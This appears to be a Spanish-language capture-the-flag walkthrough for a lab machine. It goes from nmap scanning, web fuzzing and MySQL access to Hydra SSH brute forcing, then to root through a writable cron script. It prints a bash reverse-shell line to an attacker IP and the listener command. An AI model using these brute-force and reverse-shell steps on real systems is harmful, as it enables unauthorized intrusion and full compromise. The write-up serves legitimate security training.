
## 1. Reconocimiento

```bash
sudo nmap -sS -p- --open --min-rate 5000 172.17.0.2 -oG nmap1.txt
nmap -sVC -p22,80,3306 172.17.0.2 -oG servs.txt
```

Puertos abiertos:

| Puerto | Servicio             | Relevancia                |
| ------ | -------------------- | ------------------------- |
| 22     | SSH (OpenSSH 9.6p1)  | Acceso remoto             |
| 80     | HTTP (Apache 2.4.58) | Aplicación web con pistas |
| 3306   | MySQL 8.0.42         | Base de datos expuesta    |

El puerto 3306 expuesto directamente es una señal importante — MySQL raramente debe ser accesible desde el exterior.

---
## 2. Enumeración web

```bash
curl 172.17.0.2
```

La web expone tres directorios: `/imagenes/`, `/documentos/`, `/archives/`. Se visita `/imagenes/` y se encuentra un `README.txt` con una pista:

```
(password1) Encuentra donde ponerla ;)
```

Se anota para uso posterior.

Sin más vectores visibles, se lanza fuzzing de directorios:

```bash
ffuf -u 'http://172.17.0.2/FUZZ' \
  -w /opt/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -e txt,php,db,zip
```

Se descubre `/secret`.

---
## 3. Reconocimiento de /secret

La página `/secret` muestra una tabla con usuarios del sistema: `grooti` (Administrador), `rocket` (Subcoordinador), `Naia` (Total).

También contiene un enlace para descargar `instrucciones.txt`. El archivo tiene 508 líneas aparentemente vacías — técnica de whitespace steganography para ocultar información. En la línea 508 se encuentra el dato clave:

```
mysql -u rocket -p -h 172.17.0.2 --ssl=0
```

---
## 4. Acceso a MySQL

Con el usuario `rocket` y la contraseña encontrada en el README (`password1`):

```bash
mysql -u rocket -p -h 172.17.0.2 --ssl=0
# contraseña: password1
```

```sql
show databases;
-- files_secret, information_schema, performance_schema

use files_secret;
show tables;
-- rutas

select * from rutas;
```

```
+----+------------+---------------------------------+
| id | nombre     | ruta                            |
+----+------------+---------------------------------+
|  1 | imagenes   | /var/www/html/files/imagenes/   |
|  2 | documentos | /var/www/html/files/documentos/ |
|  3 | facturas   | /var/www/html/files/facturas/   |
|  4 | secret     | /unprivate/secret               |
+----+------------+---------------------------------+
```

La base de datos revela una ruta no listada en la web: `/unprivate/secret`.

---
## 5. Brute force de parámetro numérico con Burp Intruder

La ruta `/unprivate/secret/` contiene un formulario POST con dos campos: `content` (texto) y `number` (número del 1 al 100). Cada combinación devuelve un archivo distinto.

Se intercepta la petición con Burp Suite y se envía al **Intruder** (`Ctrl+I`). Se marca el valor del parámetro `number` como posición de ataque y se configura el payload:

- **Payload type:** Numbers
- **Range:** 1 to 100, step 1

Se lanza el ataque y se analiza la columna `Length` de las respuestas. El número **16** devuelve una respuesta con `Content-Length: 429` y `Content-Type: application/zip` — completamente distinto al resto.

Se descarga manualmente:

```
POST /unprivate/secret/generate.php
content=test&number=16
```

El servidor devuelve `password16.zip`, protegido con contraseña. Se prueba `password1` (la encontrada en el README) y funciona:

```bash
unzip password16.zip
# contraseña: password1
```

El contenido de `password16.txt` es una wordlist con 34 contraseñas candidatas.

---
## 6. Fuerza bruta SSH con Hydra

Los indicios apuntan al usuario `grooti` — es el administrador según `/secret`, y la ruta se llama "Grooti Terminal Access". Se lanza Hydra contra SSH:

```bash
hydra -l 'grooti' -P password16.txt ssh://172.17.0.2
```

```
[22][ssh] host: 172.17.0.2   login: grooti   password: YoSoYgRoOt
```

```bash
ssh grooti@172.17.0.2
# contraseña: YoSoYgRoOt
```

---
## 7. Escalada de privilegios — Cron job con script escribible por grupo

```bash
sudo -l          # Sin permisos sudo
find / -perm -4000 2>/dev/null   # Solo binarios estándar
getcap -r / 2>/dev/null          # Sin capabilities
crontab -e
```

El crontab revela una tarea que se ejecuta cada minuto:

```
* * * * * /opt/cleanup.sh
```

```bash
cat /opt/cleanup.sh
# #!/bin/bash
# bash /tmp/malicious.sh
```

El script de root llama a `/tmp/malicious.sh`. Se inspeccionan los permisos:

```bash
ls -la /tmp/malicious.sh
# -rwxrw-r-- 1 root grooti 221 Jul 22 2025 /tmp/malicious.sh
```

Los permisos `rw-` para el grupo `grooti` permiten escribir en el archivo — y `grooti` pertenece a ese grupo. Como root ejecuta `/opt/cleanup.sh` cada minuto, y este llama a `/tmp/malicious.sh`, cualquier modificación en `malicious.sh` se ejecutará como root en la siguiente iteración del cron.

Se añade una reverse shell al final del script:

```bash
echo "bash -i >& /dev/tcp/172.17.0.1/4444 0>&1" >> /tmp/malicious.sh
```

Listener en la máquina atacante:

```bash
nc -lvnp 4444
```

En menos de un minuto el cron ejecuta el script y llega la conexión:

```bash
id      # uid=0(root) gid=0(root) groups=0(root)
whoami  # root
```

Flag de root en `/root/grooti.txt`.